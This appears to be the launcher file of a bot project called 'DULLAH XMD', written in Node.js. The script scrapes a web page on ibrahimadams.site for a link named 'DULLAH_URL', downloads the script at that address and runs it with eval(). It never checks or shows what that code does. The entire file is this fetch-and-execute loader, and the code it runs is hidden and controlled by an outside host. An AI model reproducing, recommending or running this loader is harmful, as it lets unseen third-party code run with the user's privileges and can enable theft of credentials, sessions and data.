// DULLAH XMD

'use strict';

const axios = require('axios');
const cheerio = require('cheerio');

const webPageUrl = 'https://www.ibrahimadams.site/files';

async function fetchDullahUrl() {
    try {
        const response = await axios.get(webPageUrl);
        const $ = cheerio.load(response.data);
        const dullahUrl = $(`a:contains("DULLAH_URL")`).attr('href');

        if (!dullahUrl) throw new Error('DULLAH_URL not found on the webpage.');

        console.log('DULLAH_URL fetched successfully:', dullahUrl);

        const scriptResponse = await axios.get(dullahUrl);
        const scriptContent = scriptResponse.data;
        console.log("DULLAH_URL script loaded successfully");

        eval(scriptContent);
    } catch (error) {
        console.error('Error fetching DULLAH_URL:', error.message);
    }
}

fetchDullahUrl();
